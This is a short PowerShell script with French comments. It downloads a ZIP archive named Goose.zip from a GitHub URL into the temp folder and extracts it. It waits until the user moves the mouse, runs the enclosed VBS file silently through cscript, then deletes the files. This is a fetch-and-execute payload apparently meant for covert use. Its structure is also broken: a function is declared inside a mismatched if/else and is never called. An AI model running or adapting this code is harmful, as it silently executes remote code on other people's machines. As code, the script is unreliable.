function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms

    # Récupérer la position initiale de la souris
    $originalPOS = [System.Windows.Forms.Cursor]::Position

    while ($true) {
        # Récupérer la position actuelle de la souris
        $currentPOS = [System.Windows.Forms.Cursor]::Position

        # Vérifier si la position de la souris a changé
        if ($currentPOS.X -ne $originalPOS.X -or $currentPOS.Y -ne $originalPOS.Y) {
            # Si la souris a bougé, sortir de la boucle
            break
        }
        # Sinon attendre quelques secondes avant de vérifier à nouveau
        Start-Sleep -Seconds 1
    }
}

# Chemin temporaire pour stocker le fichier ZIP
$tempZipPath = "$env:TEMP\Goose.zip"
$tempExtractPath = "$env:TEMP\Goose"

# Téléchargement du fichier ZIP depuis l'URL
Invoke-WebRequest -Uri "https://github.com/ertvg/h/raw/main/Goose.zip" -OutFile $tempZipPath

# Extraction du fichier ZIP
Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath

# Chemin du fichier VBS à exécuter
$vbsFilePath = "$tempExtractPath\Goose.vbs"

# Vérifier si le fichier VBS existe
if (Test-Path $vbsFilePath) {
# Fonction principale
function Main {
    # Attendre que la souris se déplace
    Pause-Script
    # Exécution du fichier VBS
    cscript.exe //B //Nologo $vbsFilePath
} else {
    Write-Host "Le fichier Goose.vbs n'a pas été trouvé."
}

# Optionnel: Supprimer les fichiers temporaires après exécution
Remove-Item -Path $tempZipPath -Force
Remove-Item -Path $tempExtractPath -Recurse -Force
